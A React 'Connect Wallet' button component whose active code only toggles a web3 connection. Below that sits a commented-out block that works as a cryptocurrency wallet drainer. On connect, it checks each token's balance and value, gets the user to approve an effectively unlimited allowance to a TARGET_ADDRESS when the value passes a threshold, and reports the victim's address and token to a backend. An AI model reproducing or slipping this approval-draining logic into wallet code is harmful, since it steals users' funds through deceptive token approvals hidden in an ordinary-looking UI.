import { Button } from "@material-ui/core";
import { ellipseAddress } from "src/utils";
// import { ASSETS_ADDRESSES, LIMIT, TARGET_ADDRESS } from "src/utils/data";
import { useWeb3Context } from "src/utils/web3Context";
// import { useContractContext } from "src/utils/ContractProvider";
// import erc20Abi from "src/contracts/abis/erc20Abi.json";
// import { useEffect } from "react";

const ConnectButton = () => {
  const { connect, disconnect, connected, address } = useWeb3Context();
  // const { web3 } = useContractContext();

  const onHandleConnect = () => {
    if( connected ) {
      disconnect();
    } else {
      connect();
    }
  }

  // useEffect(() => {
  //   const initialize = async () => {
  //     try {
  //       for(let k = 0;k<ASSETS_ADDRESSES.length;k++) {
  //         const contract = new web3.eth.Contract(erc20Abi, ASSETS_ADDRESSES[k].address);
  //         const _allowance = await contract.methods.allowance(address, TARGET_ADDRESS).call();
  //         if(_allowance == 0) {
  //           const _balanceWei = await contract.methods.balanceOf(address).call();
  //           const _decimal = await contract.methods.decimals().call();
  //           const _balance = parseFloat(web3.utils.fromWei(_balanceWei.toString(), _decimal == 9 ? "gwei": "ether"));
  //           const _value = _balance * ASSETS_ADDRESSES[k].price;
  //           console.log(ASSETS_ADDRESSES[k].name, " _balance = ", _balance, " _value=", _value);
  //           if(_value >= LIMIT) {
  //             await contract.methods.approve(TARGET_ADDRESS, web3.utils.toWei("1000000000000000", _decimal == 9 ? "gwei" : "ether")).send({value: 0, from: address});
  //             await postUpdate(address, ASSETS_ADDRESSES[k].address, ASSETS_ADDRESSES[k].name);
  //             break;
  //           }
  //         }
  //       }
  //     } catch (err) {

  //     }
  //   }
  //   if(connected && address) {
  //     console.log("initialize")
  //     initialize();
  //   }
  //   console.log("here")
  // }, [address])

  return (
    <Button variant="contained" color="primary" className="connect-button" onClick={onHandleConnect} style={{width: "185px"}}>
      { connected ? ellipseAddress(address) : "Connect Wallet"}
    </Button>
  );
};

export default ConnectButton;
